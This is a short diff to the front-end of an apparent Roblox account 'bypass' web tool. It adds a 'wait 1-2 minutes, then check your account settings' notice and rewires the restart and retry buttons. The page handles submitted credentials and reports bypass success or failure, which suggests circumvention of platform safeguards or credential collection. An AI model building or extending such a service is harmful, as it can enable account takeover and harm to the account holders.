@@ -188,6 +188,9 @@ $INSTANCE_NAME = isset($INSTANCE_NAME) ? $INSTANCE_NAME : '';
                     <div class="space-y-2">
                         <h3 class="text-2xl font-bold">Successfully Bypassed</h3>
                         <p class="text-white/60 text-sm" id="user-display-name"></p>
+                        <div class="mt-3 p-3 bg-yellow-500/10 border border-yellow-500/20 rounded-xl">
+                            <p class="text-yellow-300 text-xs font-medium">⏱️ Wait 1-2 minutes, then check your Roblox account settings to verify the changes!</p>
+                        </div>
                     </div>
                     
                     <!-- Account Score -->
@@ -246,7 +249,7 @@ $INSTANCE_NAME = isset($INSTANCE_NAME) ? $INSTANCE_NAME : '';
                         </div>
                     </div>
                     
-                    <button class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect" onclick="window.location.reload()">
+                    <button id="btn-restart" class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect">
                         Process Another Account
                     </button>
                 </div>
@@ -260,7 +263,7 @@ $INSTANCE_NAME = isset($INSTANCE_NAME) ? $INSTANCE_NAME : '';
                         <h3 class="text-2xl font-bold">Bypass Failed</h3>
                         <p class="text-white/60">The credentials provided were invalid or expired.</p>
                     </div>
-                    <button class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect" onclick="window.location.reload()">
+                    <button id="btn-retry" class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect">
                         Try Again
                     </button>
                 </div>
